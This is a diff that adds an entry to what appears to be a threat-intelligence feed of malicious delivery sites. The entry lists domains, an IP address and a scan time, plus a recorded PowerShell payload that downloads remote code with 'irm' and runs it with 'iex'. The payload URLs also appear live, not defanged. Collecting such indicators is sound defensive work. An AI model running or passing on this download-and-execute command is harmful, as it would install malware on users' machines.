@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "aispar.africa",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/122c9ed39540c827"
+    ],
+    "IP": [
+      "102.212.247.147"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/122c9ed39540c827')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/122c9ed39540c827"
+    ],
+    "ReportId": "cmwz4gsnv0iq30omlwd650f6z",
+    "ScannedAt": "2026-11-27T15:14:22.926000+00:00"
+  },
+  {
     "UrlDomain": "staging.smilesbydelivery.com",
     "DeliveryUrl": [
       "browse-login.info",
